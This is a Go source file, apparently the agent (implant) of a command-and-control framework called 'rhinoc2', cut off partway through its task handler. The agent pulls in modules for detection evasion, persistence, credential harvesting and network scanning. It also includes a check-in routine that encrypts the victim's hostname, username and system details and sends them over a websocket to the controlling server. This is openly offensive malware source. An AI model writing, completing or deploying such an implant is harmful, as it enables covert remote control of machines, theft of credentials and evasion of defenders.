package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"rhinoc2/pkg/commands"
	"rhinoc2/pkg/crypto"
	"rhinoc2/pkg/evasion"
	"rhinoc2/pkg/persistence"
	"rhinoc2/pkg/postexploit"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type Config struct {
	ServerURL string
	Key       string
	Interval  time.Duration
}

type Agent struct {
	id          string
	config      Config
	conn        *websocket.Conn
	crypto      *crypto.CryptoHandler
	commander   *commands.Commander
	fileMgr     *commands.FileManager
	netScanner  *commands.NetworkScanner
	evasion     *evasion.EvasionHandler
	persistence *persistence.PersistenceHandler
	credHarvest *postexploit.CredentialHarvester
}

func generateID() string {
	b, _ := crypto.GenerateRandomBytes(16)
	return fmt.Sprintf("%x", b)
}

func newAgent(config Config) *Agent {
	ph, _ := persistence.NewPersistenceHandler()
	return &Agent{
		id:          generateID(),
		config:      config,
		crypto:      crypto.NewCryptoHandler(config.Key),
		commander:   commands.NewCommander(),
		fileMgr:     commands.NewFileManager(),
		netScanner:  commands.NewNetworkScanner(),
		evasion:     evasion.NewEvasionHandler(),
		persistence: ph,
		credHarvest: postexploit.NewCredentialHarvester(),
	}
}

func (a *Agent) checkin() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	sysInfo := commands.GetSystemInfo()

	checkinData := map[string]interface{}{
		"id":       a.id,
		"hostname": hostname,
		"username": username,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"sysinfo":  sysInfo,
	}

	data, _ := json.Marshal(checkinData)
	encrypted, err := a.crypto.Encrypt(data)
	if err != nil {
		return err
	}

	return a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
}

func (a *Agent) handleTask(task map[string]interface{}) {
	taskID := task["ID"].(string)
	command := task["Command"].(string)
	args := ""
